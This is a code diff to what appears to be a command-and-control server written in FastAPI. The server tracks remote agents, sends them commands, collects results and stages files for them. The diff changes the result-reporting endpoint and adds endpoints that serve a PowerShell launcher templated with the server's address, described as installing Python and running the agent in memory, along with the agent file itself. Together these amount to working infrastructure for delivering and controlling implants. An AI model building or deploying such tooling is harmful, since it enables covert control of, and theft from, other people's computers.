@@ -1,7 +1,7 @@
 from typing import Union, Dict
 from agent import Agent
 from fastapi import FastAPI, Request, HTTPException, UploadFile, File, Depends
-from fastapi.responses import FileResponse
+from fastapi.responses import FileResponse, Response
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from collections import defaultdict
@@ -324,21 +324,21 @@ def set_commands(commands: Commands):
 
 
 @app.post("/agent/set_command_result")
-def set_command_result(agent_id: int, command_id: int, status: str, result: str = None, error: str = None):
+def set_command_result(command: CommandResult):
     """New endpoint - agent reports command result"""
-    if agent_id not in agents:
-        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
-    ag: Agent = agents[agent_id]
+    if command.agent_id not in agents:
+        raise HTTPException(status_code=404, detail=f"Agent {command.agent_id} not found")
+    ag: Agent = agents[command.agent_id]
 
     # Get command info before setting result
-    command_info = ag.commands.get(command_id)
+    command_info = ag.commands.get(command.command_id)
 
-    success = ag.set_result(command_id, status, result, error)
+    success = ag.set_result(command.command_id, command.status, command.result, command.error)
     if not success:
-        raise HTTPException(status_code=404, detail=f"Command {command_id} not found")
+        raise HTTPException(status_code=404, detail=f"Command {command.command_id} not found")
 
     # If set_sleep_time command succeeded, update agent's sleep_time
-    if command_info and command_info['type'] == 'set_sleep_time' and status == 'success':
+    if command_info and command_info['type'] == 'set_sleep_time' and command.status == 'success':
         new_sleep_time = command_info['data'].get('sleep_time')
         if new_sleep_time:
             ag.set_sleep_time(new_sleep_time)
@@ -506,6 +506,51 @@ async def upload_file_for_agent(agent_id: int, file: UploadFile = File(...), use
         'message': f'File ready for agent {agent_id} to download',
         'download_url': f'/files/agent_{agent_id}/{safe_filename}'
     }
+
+
+################### Payload Generator Endpoints
+@app.get("/payload/launcher.ps1")
+def get_launcher_script(request: Request):
+    """
+    Serve PowerShell launcher script for agent deployment
+    This script auto-installs Python if needed and executes the agent in memory
+    """
+    # Use the Host header from the HTTP request - this contains the address the client used
+    # to access the server (e.g., "192.168.1.10:8000"), ensuring remote agents connect properly
+    server_url = request.headers.get("host") or f"{request.url.hostname}:{request.url.port or 8000}"
+
+    # Load the launcher template from file
+    template_path = Path(__file__).parent / "files" / "launcher.ps1"
+
+    if not template_path.exists():
+        raise HTTPException(status_code=404, detail="Launcher template not found")
+
+    # Read template and replace placeholder with actual server URL
+    with open(template_path, 'r', encoding='utf-8') as f:
+        launcher_script = f.read()
+
+    # Replace the {{SERVER_URL}} placeholder with actual server address
+    launcher_script = launcher_script.replace("{{SERVER_URL}}", server_url)
+
+    return Response(content=launcher_script, media_type="text/plain")
+
+
+@app.get("/payload/allinone.py")
+def get_agent_payload():
+    """
+    Serve the agent Python file for deployment
+    This is the all-in-one agent with all dependencies in a single file
+    """
+    agent_path = Path(__file__).parent.parent / "Agent" / "allinone.py"
+
+    if not agent_path.exists():
+        raise HTTPException(status_code=404, detail="Agent file not found")
+
+    return FileResponse(
+        path=str(agent_path),
+        filename="allinone.py",
+        media_type="text/plain"
+    )
 
 
 if __name__ == "__main__":
